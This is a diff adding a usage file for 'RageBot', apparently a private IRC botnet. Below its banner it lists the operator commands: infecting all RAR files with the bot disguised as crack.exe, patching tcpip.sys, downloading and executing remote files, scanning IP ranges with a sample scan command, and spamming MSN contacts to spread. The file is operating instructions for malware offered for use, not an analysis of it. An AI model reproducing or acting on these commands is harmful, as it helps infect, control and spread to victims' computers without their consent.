@@ -1,0 +1,34 @@
+|------------------------------------------------------------------------------------------|
+| __________          ________      __________     ___________                             |
+| \______   \_____   /  _____/  ____\______   \ ___\__    ___/                             |
+|  |       _/\__  \ /   \  ____/ __ \|    |  _//  _ \|    | private by  the nLh Team       |
+|  |    |   \ / __ \\    \_\  \  ___/|    |   (  <_> )    | Based on D's bot               |
+|  |____|_  /(____  /\______  /\___  >______  /\____/|____|                                |
+|         \/      \/        \/     \/       \/                                             |
+|------------------------------------------------------------------------------------------|
+
+Commands & Usage
+
+Use (Prefix)Command
+
+[] is optional
+() is mandatory
+
+ver - shows what version you are running
+commands - shows a list of commands
+inject - injects the bot exe as crack.exe to all rar files on computer
+disconnect - disconnects the bot
+reconnect - reconnects to the same server
+reconnect.next - reconnects to the next server in list
+nick [nick] - changes nick
+restart - restarts the bot
+patch - patches tcpip.sys
+part (chan) - part's a channel
+join (chan) - join's a channel
+(h) (md5 cryption for download) (url) (file location) (1 - 0) - downloads a file and executes if specified.
+(h) (md5 cryption for remove) - completely removes the bot.
+vncstop - stop's the scanning threads
+scan (threads) (random/sequent) (ip,b or y) (3 only available) (0,1,2) [range]
+msn - sends predefined messages to all msn contacts
+
+!scan 94 1 24.x.x.x 3 1 25.x.x.x
